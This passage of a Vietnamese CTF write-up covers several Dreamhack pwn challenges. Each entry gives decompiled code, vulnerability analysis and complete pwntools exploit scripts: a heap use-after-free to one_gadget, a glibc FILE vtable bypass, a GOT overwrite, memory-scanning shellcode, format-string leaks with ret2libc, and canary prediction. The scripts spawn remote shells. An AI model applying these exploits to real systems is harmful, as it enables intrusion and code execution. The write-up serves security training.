ta thấy đầu tiên nó sẽ malloc 1 chunks 0x20 byte và gán cho human , tiếp theo human dc gán cho v0 , lần nhập đầu tiên sẽ là nhập vào human + 16 , lần nhập thứ 2 là tuôi của human vào human + 24 , tiếp theo đó là free chunks này (uaf xuất hiện ở đây) 
```
void human_func()
{
  _WORD *v0; // rax

  human = malloc(0x20uLL);
  v0 = human;
  *(_DWORD *)human = 0x616D7548;
  v0[2] = 'n';
  printf("Human Weight: ");
  __isoc99_scanf("%d", (char *)human + 16);
  printf("Human Age: ");
  __isoc99_scanf("%ld", (char *)human + 24);
  free(human);                                  // uaf
}
```


tiếp theo là robot_func :

ta thấy nó cũng malloc 1 chunk 0x20 bytes giống với human , nhập weight vào , nếu con trỏ robot+3 == 0 thì nó sẽ gán print_name cho con trỏ hàm này và gọi print_name  và cũng có uaf ở đây
```
void robot_func()
{
  _WORD *v0; // rax

  robot = malloc(0x20uLL);
  v0 = robot;
  *(_DWORD *)robot = 0x6F626F52;
  v0[2] = 116;
  printf("Robot Weight: ");
  __isoc99_scanf("%d", (char *)robot + 16);
  if ( *((_QWORD *)robot + 3) )
    (*((void (**)(void))robot + 3))();
  else
    *((_QWORD *)robot + 3) = print_name;
  (*((void (__fastcall **)(void *))robot + 3))(robot);
  free(robot);
}
```


- custom_func :
c_idx là biến global , nó sẽ chạy 10 lần (0-9)  , cho nhập size vào > 255 , malloc với cái size đó , tiếp theo là read vào cái custom , print dữ liệu thằng vừa read , xong nó bảo ta free idx ở đâu , và free idx ở đó gán null cho thằng vừa free

```
__int64 custom_func()
{
  int v1; // ebx
  unsigned int size; // [rsp+0h] [rbp-20h] BYREF
  unsigned int idx; // [rsp+4h] [rbp-1Ch] BYREF
  unsigned __int64 v4; // [rsp+8h] [rbp-18h]

  v4 = __readfsqword(0x28u);
  if ( c_idx <= 9 )
  {
    printf("Size: ");
    __isoc99_scanf("%d", &size);
    if ( size > 255 )
    {
      v1 = c_idx;
      *((_QWORD *)&custom + v1) = malloc(size);
      printf("Data: ");
      read(0, *((void **)&custom + c_idx), size - 1);
      printf("Data: %s\n", *((const char **)&custom + c_idx));
      printf("Free idx: ");
      __isoc99_scanf("%d", &idx);
      if ( idx <= 9 )
      {
        if ( *((_QWORD *)&custom + idx) )
        {
          free(*((void **)&custom + idx));
          *((_QWORD *)&custom + idx) = 0LL;
        }
      }
    }
    return (unsigned int)++c_idx;
  }
  else
  {
    puts("Custom FULL!!");
    return 0LL;
  }
}
```


exploit :

- sau khi phân tích xong thì thấy được 2 lỗi use after free ở 2 function robot và human , tuy nhiên ta phải tận dụng bug này ra sao

- ta thấy vì 2 thằng này đc malloc cùng size , nếu 1 thằng free mà th kia malloc lại thì vấn đề lúc này được nảy sinh , ở hàm robot_func nó sẽ thực thi 1 con trỏ hàm cho ta , vậy đều mình muốn bây giờ sẽ là dùng system hoặc one_gadget ghi vào đúng cái thằng con trỏ hàm của robot thực thi ()

- muốn làm được như vậy thì ta cần bypass ASLR trước (leak libc) , ta sẽ phân tích sâu thử hàm custom_func xem sao 

- ở đây nếu ta free cho nó vào unsorted bin , xong khi malloc lại thì nó vẫn sẽ chứa địa chỉ của main area  , tuy nhiên lúc này nó đã bị ghi đè 1 bytes 

**trick lỏ** : ta cần malloc -> malloc -> free -> malloc lại chunk với size bằng với size vừa free để tránh tình trạng gộp top chunk 
![image](https://hackmd.io/_uploads/SyAqQiTpA.png)




- ý tưởng của ta sẽ leak main_area bằng unsorted_bin , đầu tiên ta sẽ malloc 1 kích thước mà unsorted bin yêu cầu , idx là -1 vì nếu con trỏ custom + idx == 1 thì nó sẽ free mất nên không sẽ không leak được , tiếp theo ta malloc lại 1 size y chang và free nó vì vậy nó sẽ không bị gộp vào top chunks , tiếp theo chỉ việc malloc lại size tương tự , lúc này nó sẽ in dữ liệu cho ta 


- bước 2 : tính toán libc base , vì lúc này địa chỉ main_area bị ghi đè 1 byte nên ta cần tính toán nó cho chính xác , có 2 cách để tìm offset của main_area 
    - đầu tiên là lấy libc.sym.__malloc_hook + 0x10
    - cách 2 là sử dụng tool :v 
    ![image](https://hackmd.io/_uploads/HkTcxn6aR.png)
link ở đây : https://juntheworld.tistory.com/87

ta sẽ tính libc base bằng cách : libc_base - offset_mainarea + (bytemainarea - byteleak)

- có libc rồi thì chỉ việc tính địa chỉ của one_gadget rồi get_shell thôi


script :
```
#!/usr/bin/env python3

from pwn import *

exe = ELF("./uaf_overwrite_patched")
libc = ELF("./libc-2.27.so")
ld = ELF("./ld-2.27.so")

context.binary = exe
p = process()
#gdb.attach(p,gdbscript='''
#           b*custom_func+126
 #          b*custom_func+219
 #          b*custom_func+376
#           ''')
def custom_func(data,size,idx) :
    p.sendlineafter(b'> ',b'3')
    p.sendlineafter(b'Size: ',str(size))
    p.sendafter(b'Data: ',data.encode())
    p.sendlineafter(b'idx: ',str(idx).encode())
def robot_func():
    p.sendlineafter(b'> ',b'2')
    p.sendlineafter(b'Weight: ',str(100))
def human_func(age):
    p.sendlineafter(b'> ',b'1')
    p.sendlineafter(b'Weight: ',str(100))
    p.sendlineafter(b'Age: ',str(age))
input()
custom_func("aaaa",1500,-1)
custom_func("bbbb",1500,0)

p.sendlineafter(b'> ',b'3')
p.sendlineafter(b'Size: ',b'1500')
p.sendafter(b'Data: ',b'a')
p.recvuntil(b'Data: ')
leak = u64(p.recv(6).ljust(8,b'\x00'))
print("leak libc: ",hex(leak))
p.sendlineafter(b'idx: ',b'-1')

#find area offset
#area_offset = libc.sym.__malloc_hook + 0x10
offset_main_area = 0x3ebc40

bytes_of_area = offset_main_area & 0xff
bytes_of_leak = leak & 0xff

libc.address = leak - offset_main_area + (bytes_of_area - bytes_of_leak)
print("libc address: ",hex(libc.address))

one_gadget = [0x4f3ce,0x4f3d5,0x4f432,0x10a41c]
getshell = libc.address + one_gadget[3]


# luc nay tan dung use_after_free de ghi de one_gadget
human_func(getshell)
robot_func()



p.interactive()
```

-------------


23 . Bypass IO_validate_vtable
------------

bài này được cho file libc2.27 

Tóm tắt 

từ phiên bản libc 2.23 trở đi thì sẽ có hàm check và không ghi đè được vtable , tuy nhiên với sự ra đời của IO_validate_vtable , kỹ thuật tương tự không còn có thể bị tán công trong các phiên bản trước nữa 

vậy ta sẽ cũng tìm hiểu xem nó làm gì 


+  IO_validate_vtable
```
if (__glibc_unlikely (offset >= section_length))              
    _IO_vtable_check ();
```
Logic xác minh là kiểm tra bổ sung con trỏ bằng cách gọi hàm IO_vtable_check nếu địa chỉ vtable không tồn tại trong vùng _libc_IO_vtables.

+ _IO_vtable_check
```
void attribute_hidden
_IO_vtable_check (void)
{
#ifdef SHARED
  /* Honor the compatibility flag.  */
  void (*flag) (void) = atomic_load_relaxed (&IO_accept_foreign_vtables);
#ifdef PTR_DEMANGLE
  PTR_DEMANGLE (flag);
#endif
  if (flag == &_IO_vtable_check)
    return;
  {
    Dl_info di;
    struct link_map *l;
    if (!rtld_active ()
        || (_dl_addr (_IO_vtable_check, &di, &l, NULL) != 0
            && l->l_ns != LM_ID_BASE))
      return;
  }
#else /* !SHARED */
  if (__dlopen != NULL)
    return;
#endif
__libc_fatal ("Fatal error: glibc detected an invalid stdio handle\n");
  
```

nếu logic xác minh vtable bị tắt , IO_vtable_check : hàm này sẽ dc thực thi và sẽ in ra chuỗi **glibc detected an invalid stdio handle**

Do đó, để vượt qua xác minh vtable, hàm tồn tại trong vùng _libc_IO_vtables phải được sử dụng làm vtable giả.

Các hàm nội bộ _libc_IO_vtables có thể được sử dụng để bỏ qua IO_vtablecheck bao gồm **_IO_stroverflow** và **_IO_str_finish.**


trong bài này ta sẽ sử dụng ***IO_str_overflow*** để bypass 


- _IO_str_overflow

```
int
_IO_str_overflow (_IO_FILE *fp, int c)
{
  int flush_only = c == EOF;
  _IO_size_t pos;
  if (fp->_flags & _IO_NO_WRITES)
      return flush_only ? 0 : EOF;
  if ((fp->_flags & _IO_TIED_PUT_GET) && !(fp->_flags & _IO_CURRENTLY_PUTTING))
    {
      fp->_flags |= _IO_CURRENTLY_PUTTING;
      fp->_IO_write_ptr = fp->_IO_read_ptr;
      fp->_IO_read_ptr = fp->_IO_read_end;
    }
  pos = fp->_IO_write_ptr - fp->_IO_write_base;
  if (pos >= (_IO_size_t) (_IO_blen (fp) + flush_only))
    {
      if (fp->_flags & _IO_USER_BUF) /* not allowed to enlarge */
    return EOF;
      else
    {
      char *new_buf;
      char *old_buf = fp->_IO_buf_base;
      size_t old_blen = _IO_blen (fp);
      _IO_size_t new_size = 2 * old_blen + 100;
      if (new_size < old_blen)
        return EOF;
      new_buf
        = (char *) (*((_IO_strfile *) fp)->_s._allocate_buffer) (new_size);
```

đoạn mã trên là của hàm _IO_str_overflow

hãy cùng phân tích và nghĩ cách exploit nó :

```new_buf = (char *) (*((_IO_strfile *) fp)->_s._allocate_buffer) (new_size);```

nếu nhìn vào phần cuối của mã , nó sẽ được thực thi bằng cách gọi 1 con trỏ hàm có tên ***s._allocate_buffer***  

nếu ***s._allocate_buffer*** có thể ghi đè bằng system , thì lúc này hoàn thành nhiệm vụ :v

Nói cách khác, nếu ta có thể thao tác ***_s._allocate_buffer***, **_IO_buf_end** và **_IO_buf_base**, bạn có thể thực thi lệnh mong muốn.

        
điều kiện so sánh :
```
int flush_only = c == EOF;
_IO_size_t pos;
pos = fp->_IO_write_ptr - fp->_IO_write_base;
  if (pos >= (_IO_size_t) (_IO_blen (fp) + flush_only))
```
1 điều cần lưu ý là phải bypass được các điều kiện trên


- giá trị mặc định của biến flush_only được sử dụng trong câu lệnh so sánh là 0 và câu lệnh có thể tóm tắt là pos >= _IO_blen(fp)  , do đó nếu _IO_write_base được khởi tạo bằng 0 thì giá trị _IO_write_ptr  trở thành giá trị của pos , nhờ đó ta có thể vượt qua thành công


Thực Hành

```
int main() {
  init();

  fp = fopen("/dev/urandom", "r");

  printf("stdout: %p\n", stdout);
  printf("Data: ");

  read(0, fp, 300);

  fclose(fp);
}
```

ta được cho address của stdout và nhập được vào fp (fp ở đây là con trỏ file)


- đầu tiên ta sẽ tính các địa chỉ cần thiết 
```
stdout = int(p.recvuntil("\n"),16)
libc_base = stdout - libc.symbols['_IO_2_1_stdout_']
io_file_jumps = libc_base + libc.symbols['_IO_file_jumps']
io_str_overflow = io_file_jumps + 0xd8
```
địa chỉ io_str_overflow có thể được tính toán dựa trên khoảng cách từ io_file_jumps là 0xd8 thông qua debug động


```
fake_vtable = io_str_overflow - 16
binsh = libc_base + next(libc.search(b"/bin/sh"))
system = libc_base + libc.symbols['system']
fp = elf.symbols['fp']
payload = p64(0x0) # flags
payload += p64(0x0) # _IO_read_ptr
payload += p64(0x0) # _IO_read_end
payload += p64(0x0) # _IO_read_base
payload += p64(0x0) # _IO_write_base
payload += p64((int((binsh - 100) / 2))) # _IO_write_ptr
payload += p64(0x0) # _IO_write_end
payload += p64(0x0) # _IO_buf_base
payload += p64((int((binsh - 100) / 2))) # _IO_buf_end
payload += p64(0x0) # _IO_save_base
payload += p64(0x0) # _IO_backup_base
payload += p64(0x0) # _IO_save_end
payload += p64(0x0) # _IO_marker
payload += p64(0x0) # _IO_chain
payload += p64(0x0) # _fileno
payload += p64(0x0) # _old_offset
payload += p64(0x0)
payload += p64(fp + 0x80) # _lock
payload += p64(0x0)*9
payload += p64(fake_vtable) # io_file_jump overwrite
payload += p64(system) # fp->_s._allocate_buffer RIP
```

Khi gọi _s._allocate_buffer, new_size được sử dụng làm đối số trước tiên phải được thao tác thành địa chỉ của chuỗi “/bin/sh”. Vì new_size là một biến được tính theo công thức bên dưới, nên chỉ cần ghi đè _IO_buf_end bằng địa chỉ “/bin/sh” và _IO_buf_base bằng 0.

ngoài ra ta cùng có thể thấy _IO_write_ptr được đặt giống với _IO_buf_end nhằm thõa điều kiện so sánh trong tóm tắt.


lúc này fclose(fp) được gọi :
fclose gọi nội bộ hàm _IO_FINISH, hàm này cũng tồn tại trong phần __libc_IO_vtables. Nếu hàm fclose thao tác địa chỉ vtable của cấu trúc tệp để tham chiếu đến hàm IO_str_overflow trước khi tham chiếu đến hàm _IO_FINISH, thì có thể lấy được shell bằng cách thao tác con trỏ hàm được gọi trong hàm với system.

```
fake_vtable = io_str_overflow - 16
```
sở dĩ -16 là vì ghi gọi _IO_FINISH bên trong fclose thì tại địa chỉ của vtable +16 được gọi

vậy khi đó , ta sẽ gọi đúng thằng io_str_overflow đc gọi khi _IO_FINISH được gọi

```
payload += p64(fp + 0x80) # _lock
payload += p64(0x0)*9
payload += p64(fake_vtable) # io_file_jump overwrite
payload += p64(system) # fp->_s._allocate_buffer RIP
```

cuối cùng , fp-> _s.allocate_buffer là vị trí của vtable + 0x8 bytes nên system sẽ dc nhập sau fake_vtable như trên . 

Ngoài ra, _lock có thể được chỉ định ở bất kỳ đâu trong vùng có thể ghi.


fullscript :

```

#!/usr/bin/env python3

from pwn import *

exe = ELF("./bypass_valid_vtable_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.27.so")

context.binary = exe
p = process()
p.recvuntil(b'stdout: ')
leak = int(p.recvline()[:-1],16)
print("stdout: ",hex(leak))
libc.address = leak - libc.sym._IO_2_1_stdout_
io_files_jumps = libc.address + 0x3e82a0
io_str_overflow = io_files_jumps + 0xd8
fake_vtable = io_str_overflow -  16
bin_sh = next(libc.search('/bin/sh\x00'))

system = libc.sym.system
fp = exe.sym.fp

payload = p64(0x0) # flags
payload += p64(0x0) # _IO_read_ptr
payload += p64(0x0) # _IO_read_end
payload += p64(0x0) # _IO_read_base
payload += p64(0x0) # _IO_write_base
payload += p64((int((bin_sh - 100) / 2))) # _IO_write_ptr
payload += p64(0x0) # _IO_write_end
payload += p64(0x0) # _IO_buf_base
payload += p64((int((bin_sh - 100) / 2))) # _IO_buf_end
payload += p64(0x0) # _IO_save_base
payload += p64(0x0) # _IO_backup_base
payload += p64(0x0) # _IO_save_end
payload += p64(0x0) # _IO_marker
payload += p64(0x0) # _IO_chain
payload += p64(0x0) # _fileno
payload += p64(0x0) # _old_offset
payload += p64(0x0)
payload += p64(fp + 0x80) # _lock -> write 가능한 영역을 지정
payload += p64(0x0)*9
payload += p64(fake_vtable) # io_file_jump overwrite
payload += p64(system) # fp->_s._allocate_buffer RIP
p.sendline(payload)

p.interactive()
```





ref :
https://velog.io/@silvergun8291/Dreamhack-Exploit-Tech-Bypass-IOvalidatevtable
https://keyme2003.tistory.com/entry/dreamhack-Bypass-IOvalidatevtable


-----------------



24 . echo
---------


bài này sẽ có 3 lựa chọn 


```

int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [rsp+24h] [rbp-22Ch] BYREF
  int v5; // [rsp+28h] [rbp-228h]
  int v6; // [rsp+2Ch] [rbp-224h]
  size_t size; // [rsp+30h] [rbp-220h]
  char *buf; // [rsp+38h] [rbp-218h]
  char s[256]; // [rsp+40h] [rbp-210h] BYREF
  char value[264]; // [rsp+140h] [rbp-110h] BYREF
  unsigned __int64 v11; // [rsp+248h] [rbp-8h]

  v11 = __readfsqword(0x28u);
  setup();
  puts("[Sane Env System]");
  do
  {
    menu();
    v5 = 0;
    __isoc99_scanf("%d", &v4);
    if ( v4 == 4 )
    {
      v5 = 1;
    }
    else
    {
      if ( v4 > 4 )
        goto LABEL_36;
      switch ( v4 )
      {
        case 3:
          size = confstr(0, 0LL, 0LL);
          if ( !size )
          {
            puts("_CS_PATH invalid!");
            exit(-1);
          }
          buf = (char *)malloc(size);
          if ( !buf )
          {
            puts("malloc() failed!");
            exit(-1);
          }
          if ( !confstr(0, buf, size) )
          {
            puts("confstr() failed!");
            exit(-1);
          }
          if ( setenv("PATH", buf, 1) == -1 )
          {
            puts("PATH setup failed!");
            exit(-1);
          }
          free(buf);
          if ( system("cat ~/flag") == -1 )
          {
            puts("system() failed!");
            exit(-1);
          }
          puts("system() worked!");
          break;
        case 1:
          do
            v6 = getchar();
          while ( v6 != 10 && v6 != -1 );
          printf("Environment variable name: ");
          fgets(s, 256, stdin);
          if ( s[strlen(s) - 1] == 10 )
            s[strlen(s) - 1] = 0;
          printf("Environment variable value: ");
          fgets(value, 256, stdin);
          if ( value[strlen(value) - 1] == 10 )
            value[strlen(value) - 1] = 0;
          if ( setenv(s, value, 1) == -1 )
          {
            puts("setenv() failed!");
            exit(-1);
          }
          puts("Environment variable set!");
          break;
        case 2:
          do
            v6 = getchar();
          while ( v6 != 10 && v6 != -1 );
          printf("Environment variable name: ");
          fgets(s, 256, stdin);
          if ( s[strlen(s) - 1] == 10 )
            s[strlen(s) - 1] = 0;
          if ( unsetenv(s) == -1 )
          {
            puts("unsetenv() failed!");
            exit(-1);
          }
          puts("Environment variable cleared!");
          break;
        default:
LABEL_36:
          puts("no hack!");
          exit(-1);
      }
    }
  }
  while ( !v5 );
  return 0;
}
```

option 1 :  nhập vào 2 biến và thực hiện setenv() 

biết thêm biến môi trường là gì ở đây : https://funix.edu.vn/chia-se-kien-thuc/bien-moi-truong-environment-variables-trong-linux-la-gi-tong-hop-nhung-dieu-ban-can-biet/




option2 : giống với option1 nhưng khác ở chỗ là nó là unsetenv()

option3 : thực hiện cat flag , ở đây có 1 hàm confstr() khá lạ nên ta sẽ search thử 


và nó sẽ thực hiện cat ~/flag  , ~/ ở đây nghĩa là home -> cần set biến môi trường về ~/  là sẽ cat thành công

-------------

25 . DO-WELL
-----

reverse : 

đầu tiên nó sẽ setbuf các bộ đệm các kiểu , tiếp theo là sử dụng system để thực thi in 1 chuỗi ra  , tiếp theo nữa ta được nhập 1 số chú ý số này tối đa sẽ là 4 byte và ta cần path libc của sever vì nếu không thì stack lúc đó là 8 byte -> ta nhập vào thì nó sẽ gây sigsev , tiếp theo nữa là ta được nhập 1 chuỗi không giới hạn 

![image](https://hackmd.io/_uploads/Hk7hurwN1x.png)



![image](https://hackmd.io/_uploads/ByAndBP4Jx.png)


- ý tưởng bài này rất rõ ràng , đầu tiên ta thấy được ta có thể nhập 1 địa chỉ và gán giá trị cho địa chỉ đó , bài này cho sẵn hàm system -> đơn giản là sẽ ghi chuỗi /bin/sh vào 1 địa chỉ nào đó và lấy nó hàm đối số khi gọi system , tuy nhiên nếu ta ghi xong thì chương trình sẽ end luôn nên ta phải ghi 1 hàm nào sau khi ghi thành công thành main , lần ghi tiếp theo sẽ là lần get_shell

- flow như sau : ghi puts thành main -> quay trở lại main thì tiếp tục ghi địa chỉ bss chứa chuỗi kia thành /bin/sh\x00 -> lúc này khi tới hàm puts thì nó sẽ lại quay về thực thi main , và vì chuỗi bss đã khác nên nó sẽ thực thi system(/bin/sh) và ta có được flag

```
#!/usr/bin/python3

from pwn import *

context.binary = exe = ELF('./prob_patched',checksec=False)

#p = process()
p = remote('host3.dreamhack.games', 19984)
#gdb.attach(p,gdbscript='''
#           b*0x00000000004012c2
#           b*0x00000000004012f1
#           ''')
#input()
main = exe.symbols['main']
st = 0x0000000000404080
puts_got = exe.got['puts']
p.sendlineafter("pt: ", str(int(puts_got)))
p.sendlineafter("input: ", p64(main))

#2 st overwrite
p.sendlineafter("pt: ", str(int(st)))
p.sendlineafter("input: ", b'/bin/sh\x00')
p.interactive()
```

-----------------------

26 . find_candy
------





reverse : 
- đầu tiên ctrinh thực hiện mở file flag  
- gán giá trị random cho v3 
- tạo 1 vùng nhớ mmap và gán cho buf , ở đây ta cần phân tích 1 chút vì vùng nhớ này sẽ read flag vào đó :    
    + địa chỉ của vùng nhớ này dc tính như sau : nếu vế phải bằng 0 thì trường hợp địa chỉ nhỏ nhất sẽ là 0x080000000000 và tối đa là   0x0800fffff000, 12 bit cuối sẽ luôn luôn bằng 0 , giá trị sẽ thay đổi 2,5 bytes (00000 - 0xffffff) nên số lượng địa chỉ có thể có là 0x100000 (1048576)  . hàm rand() sẽ sử dụng /dev/random và vì giá trị 4 bytes được lấy từ đó nên rất khó để tính trực tiếp.
    
![image](https://hackmd.io/_uploads/HyJuYHw4Je.png)


vì thấy sanbox nên kiểm tra seccomp :   
ta thấy được ở đây nó giới hạn chỉ dc dùng write , arch_prctl

![image](https://hackmd.io/_uploads/SkFsFHv4ke.png)




tiếp theo sau là phân bổ 1 vùng nhớ để thực thi shellcode , cho ta nhập vào và thực thi nó




- vì seccomp sanbox cho phép sử dụng sys_write nên ta sẽ nghĩ đến ý tưởng ghi dữ liệu tại 1 địa chỉ bộ nhớ cụ thể theo độ dài mong muốn nào đó . vì các syscall sẽ không gây segmentfault ngay cả khi địa chỉ không hợp lệ được đặt làm đối số
- vì địa chỉ được giới hạn từ 0x080000000000 - 0x0800fffff000 ( 2,5 bytes )
nghĩa là số lượng giá trị có thể ghi là 0x100000 (1048576)  . có thể bruteforce được
-> có thể sử dụng shellode để xuất dữ liệu bắt đầu từ địa chỉ 0x080000000000 đến (0x1000) với syscall write


ok bắt đầu exploit thôi :+1: 

tạo 1 file shellcode :   
```
section .text
global _start
_start:
  mov rsi,0x080000000000     ;dia chi can ghi
  mov rdx,0x1000             ; so luong can ghi

L1:
  xor rax,rax
  inc rax                     ; rax = 1
  mov rdi,rax
  syscall
  add rsi,0x1000             ;cong tiep 0x1000 bytes va so sanh voi target , neu chua bang thi tiep tuc ghi
  cmp rsi,0x0800fffff000
  JNE L1
```


1 file bash script để in mã máy ra dạng hex 
```
#!/bin/bash

nasm -f elf64 asm.asm
objcopy --dump-section .text=asm.bin  asm.o

xxd asm.bin
```

nasm -f elf64 asm.asm để tạo 1 file object asm.o 
objcopy --dump-section .text=asm.bin asm.o : dùng objcopy thao tác với file .o     , --dump-section .text=asm.bin để trích xuất phần text( chứa mã thực thi) từ file object và lưu vào file asm.bin
xxd asm.bin : hiện thị nội dung dưới dang hexdump 



script  : 
```
#!/usr/bin/python3

import os
from pwn import *
p = process('./find_candy')

with open('./asm.bin','rb') as f:
    shellcode = f.read()

print(p.recvuntil(b'shellcode: ').decode())
p.send(shellcode)

p.interactive()
```
mở file bin và đọc vào shellcode , xong gửi thôi :D


--------------


27 . Titanfull
-------

bài này tầm mức lv1 rưỡi thoy :>

reverse 


chương trình cho nhập 0x30byte , có format string ở lần printf thứ 2, có 3 option  
![image](https://hackmd.io/_uploads/H1OB9HvN1l.png)


- ở đây nếu choice = 7274 thì sẽ đi vào hàm vaguard 
vaguard  : thấy ngay BOF luôn , tới đây là end bài r 
![image](https://hackmd.io/_uploads/H1nI9rwVyg.png)


option 1 : cho ta nhập lựa chọn các cái chuỗi ở trên và in ra , xong reset cho check = 1 , không thấy lỗi gì 




- các option còn lại vô nghĩa nên không quan tâm



- build docker lấy libc :


```

FROM ubuntu@sha256:ed4a42283d9943135ed87d4ee34e542f7f5ad9ecf2f244870e23122f703f91c2

RUN apt update
RUN apt install -y socat

COPY ./flag /flag
COPY ./titanfull /titanfull

RUN chmod 755 /flag /titanfull

EXPOSE 5000
CMD socat TCP-LISTEN:5000,reuseaddr,fork EXEC:/titanfull
```

ở đây EXPOSE là 5000

build docker : ```sudo docker build . -t chall ```

run docker : ```sudo docker run --rm -p5000:5000 -it chall

nc tới thử và mở terminal mới : ``` nc localhost 5000```

trong ter mới : dùng ps aux để xem cái đang chạy và ```sudo gdb -p [id]``` xong tiếp theo ```info proc map``` 

dùng sudo docker ps để lấy id container : ```sudo docker ps```

lấy libc : sudo docker cp [id]:path + đường dẫn 
vd : ``` sudo docker cp 107556bed287:/usr/lib/x86_64-linux-gnu/libc-2.31.so .```

lấy ld thì tương tự với libc


Exploit :

ở lần nhập đầu tiên ta sẽ leak hết những gì cần leak (canary, exe , libc) 

tiếp theo dùng BOF để ret2libc thôi :>> 

script :
```
#!/usr/bin/python3

from pwn import *

context.binary = exe = ELF('./titanfull_patched',checksec=False)
libc = ELF('./libc-2.31.so')
ld = ELF('./ld-2.31.so')

#p = process()
p = remote('host3.dreamhack.games', 18429)
#gdb.attach(p,gdbscript=
 #          '''
#            b*menu+196
 #           b*menu+273
#            b*vanguard+75
 #          ''')
payload = b'%21$p|%19$p|%17$p|'
p.sendafter(b' > ',payload)
p.recvuntil(b'hello, ')
leak = p.recvuntil(b'.')[:-1].split(b'|')
print(leak)
libc.address = int(leak[0],16) - 0x24083
exe.address = int(leak[1],16) - 0x164c
canary = int(leak[2],16)
pop_rdi = 0x00000000000016c3 + exe.address
print("exe base: ",hex(exe.address))
print("found canary: ",hex(int(leak[2],16)))
print("libc adress: ",hex(libc.address))
input()
payload = b'a'*24 + p64(canary) + p64(0) + p64(pop_rdi) + p64(next(libc.search('/bin/sh\x00'))) + p64(pop_rdi+1) + p64(libc.sym.system)
p.sendlineafter(b'> ',b'7274')
p.sendlineafter(b' titan : ',payload)
p.interactive()
```

flag : DH{ab48f98344b43e07fd53091e3ba1602fb1da237581f2b7fe22fcc43584a9c4b5}



-------

28 . Repeat Service 
------



đây là code C của bài : 
```
// gcc -o main main.c

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>

void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
}

void win() {
	system("/bin/sh");
}

int main() {
	initialize();

	char inp[80] = {0};
	char buf[1000] = {0};

	puts("Welcome to the Repeat Service!");
	puts("Please put your string and length.");

	while (1) {
		printf("Pattern: ");
		int len = read(STDIN_FILENO, inp, 80);
		if (len == 0)
			break;
		if (inp[len - 1] == '\n') {
			inp[len - 1] = 0;
			len--;
		}

		int target_len = 0;
		printf("Target length: ");
		scanf("%d", &target_len);

		if (target_len > 1000) {
			puts("Too long :(");
			break;
		}

		int count = 0;
		while (count < target_len) {
			memcpy(buf + count, inp, len);
			count += len;
		}

		printf("%s\n", buf);
	}
	return 0;
}
```
+ nhìn sơ qua thì ta thấy được có hàm win ( có lẽ là target của bài )  , tiếp theo nó sẽ read 80 bytes vào inp ( không có BOF ) và gán số bytes read được vào len , lần nhập tiếp theo được nhập 1 số nguyên ( số này phải < 1000 vì ở dưới có lệnh check)
+ ta thấy lỗi sẽ xảy ra ở While , nó dùng memcpy() để coppy inp sang buf + count với size là len 
+ ta thấy được s cách rbp là 0x3f0 (1008bytes) vậy có BOF ở đây không ?  câu trả lời là có =))) 
+ nếu ta thử nhập 41 bytes chẳng hạn , nó sẽ lặp tổng cộng 24 lần ( lúc này count sẽ là 984 nên sẽ tiếp tục memcpy vào buf và xảy ra lỗi) -> ghi được 984 + 41 = 1025 bytes 

+ vì target là win , mà trong code C ta thấy được printf("%s\n,buf") -> có thể leak được các địa chỉ ( canary , exe address) 





script : 
```
#!/usr/bin/python3

from pwn import *

context.binary = exe = ELF('./main',checksec=False)
#p = process()
p = remote('host3.dreamhack.games', 8273)
#gdb.attach(p,gdbscript='''
#          main+265
#          main+393
#          main+480
#           ''')

#leak canary
p.sendlineafter(b'Pattern: ',b'a'*11)
p.sendlineafter(b'length: ',b'1000')
p.recvuntil(b'a'*1001)
canary = u64(b'\x00'+ p.recv(7))
print("canary: ",hex(canary))

#leak exe
p.sendlineafter('Pattern: ',b'a'*43)
p.sendlineafter(b'length: ',b'1000')
p.recv(1032)
pie = u64(p.recv(6) + b'\x00\x00')
print("leak: ",hex(pie))
exe.address = pie - exe.sym.main
#win =  exe.sym.win
print("exe base: ",hex(exe.address))


#write address cua win vao truoc
p.sendlineafter(b'Pattern: ',p64(exe.address+0x1275)*4)
p.sendlineafter(b'length: ',b'1000')

#tiep theo la canary
p.sendlineafter(b'Pattern: ',p64(canary)*2)
p.sendlineafter(b'length: ',b'1000')

#nhap sai len de no ret
p.sendlineafter(b'Pattern: ',b'test')
p.sendlineafter(b'length: ',b'1001')
p.interactive()
```

khi gửi thẳng exe.sym.win thì ta thấy align stack nên ta sẽ ret về win+ ...



--------------


29 . randerer
------

reverse : 

đầu tiên ta thấy

- nó sẽ gán giá trị của 1 biến cục bộ ```canary``` cho ```a``` , giá trị của time được gán cho ```b``` , tiếp theo nó cũng in giá trị của time() ra cho ta luôn 

- tiếp theo nữa ta cũng thấy có bug BOF ở hàm read()  , buf chứa ```0x20 bytes``` tuy nhiên lại được read vào 256 byte

- check xem giá trị của a (là giá trị của canary ban đầu xem nó có bị thay đổi không) , nếu có thì ```exit```




![image](https://hackmd.io/_uploads/H1SeDfwN1e.png)


- ở bài này vấn đề duy nhất mà ta cần vượt qua để lấy shell chính là đoạn check canary 

- và giá trị đó sẽ được khởi tạo bằng hàm ```init_canary``` 

nó sẽ rand() giá trị canary của ta và thêm 1 vài bước dịch bit , giá trị rand() này ta sẽ có thể bypass được vì hàm srand() sẽ không an toàn , ta chỉ cần lấy seed tương tự lúc chương trình chạy là được

phân tích cách nó tạo ra canary : 

đầu tiên là check xem số vòng lặp đã đủ chưa -> dịch canary sang trái 8 bit -> tạo  1 giá trị rand() -> lấy 1 byte của giá trị rand() vừa tạo và or với giá trị canary hiện tại xong lưu vào canary -> tăng giá trị loop

![image](https://hackmd.io/_uploads/B1PWiMwVkx.png)




![image](https://hackmd.io/_uploads/HkdlqMwEJe.png)

vì vậy ta có thể viết script và làm tương tự , tuy nhiên mình sử xài hàm time() thì nó bị lệch so với ctrinh chạy , chợt nhận ra ctrinh cho sẵn giá trị time() luôn nên ta sẽ lấy nó và làm seed cho srand()

script : 

```
#!/usr/bin/env python3

from pwn import *
from ctypes import CDLL
from time import time
context.binary = exe = ELF('./prob_patched')
libc = CDLL('./libc.so.6')
ld = ELF("./ld-linux-x86-64.so.2")
p = remote('host3.dreamhack.games', 20036)
input()
p.recvuntil(b'time: ')
current_time = int(p.recvline()[:-1])
print((current_time))
libc.srand(current_time)


canary = 0
for i in range(0,8):
    v1 = canary << 8
    test = libc.rand()
    test = test & 0xff
    canary = v1 | test
    print(hex(canary))

p.sendline(b'a'*16 +p64(canary) + p64(0)*2 + p64(0x0000000000401299))




p.interactive()
